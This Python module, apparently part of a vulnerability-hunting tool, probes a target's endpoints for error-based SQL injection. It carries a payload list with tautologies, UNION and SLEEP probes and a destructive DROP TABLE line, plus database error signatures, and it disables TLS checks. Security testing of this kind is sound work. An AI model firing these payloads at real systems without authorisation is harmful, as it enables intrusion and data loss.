"""
ODIN-Hunter | SQLi Tester
Tests for SQL injection vulnerabilities
"""

import aiohttp
import asyncio
import re

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--", '" OR 1=1--',
    "' OR 1=1#", "admin'--", "1' ORDER BY 1--", "1' ORDER BY 2--",
    "1 UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "'; SELECT SLEEP(5)--", "1; DROP TABLE users--",
    "' AND SLEEP(5)--", "\" AND SLEEP(5)--",
    "1' AND '1'='1", "' OR 'x'='x",
    "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
]

ERROR_SIGNATURES = [
    "sql syntax", "mysql_fetch", "ORA-", "SQL Server", "sqlite_",
    "PostgreSQL", "ODBC Driver", "Unclosed quotation mark",
    "quoted string not properly terminated", "syntax error",
    "mysql error", "Warning: mysql", "valid MySQL result",
    "MySqlException", "SqlException", "SQLiteException",
    "pg_query", "PG::SyntaxError", "ERROR: syntax error at or near",
]

class SQLiTester:
    def __init__(self):
        self.timeout = aiohttp.ClientTimeout(total=15)

    async def test(self, target: str, endpoints: list) -> list:
        """Test all endpoints for SQL injection"""
        findings = []
        base_url = f"https://{target}"

        async with aiohttp.ClientSession(timeout=self.timeout) as session:
            tasks = []
            for ep in endpoints:
                path = ep.get("path", "")
                url = f"{base_url}{path}"
                tasks.append(self._test_endpoint(session, target, url))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, dict):
                    findings.append(result)

        if findings:
            print(f"[SQLiTester] 🚨 {len(findings)} SQLi findings on {target}")
        return findings

    async def _test_endpoint(self, session, target: str, url: str) -> dict:
        """Test a single endpoint for SQLi"""
        # Test GET params
        for payload in SQLI_PAYLOADS[:8]:  # Limit payloads per endpoint
            try:
                test_url = f"{url}?id={payload}&user={payload}"
                async with session.get(test_url, ssl=False, allow_redirects=False) as resp:
                    body = await resp.text(errors="ignore")
                    if self._has_sql_error(body):
                        return {
                            "target": target,
                            "type": "sql_injection",
                            "title": "SQL Injection — Error Based",
                            "severity": "critical",
                            "description": f"SQL error triggered at {url} with payload: {payload}",
                            "proof": {
                                "url": test_url,
                                "payload": payload,
                                "response_snippet": body[:500]
                            },
                            "confidence": 0.85,
                            "remediation": "Use parameterized queries / prepared statements"
                        }
            except Exception:
                pass
        return None

    def _has_sql_error(self, body: str) -> bool:
        body_lower = body.lower()
        for sig in ERROR_SIGNATURES:
            if sig.lower() in body_lower:
                return True
        return False
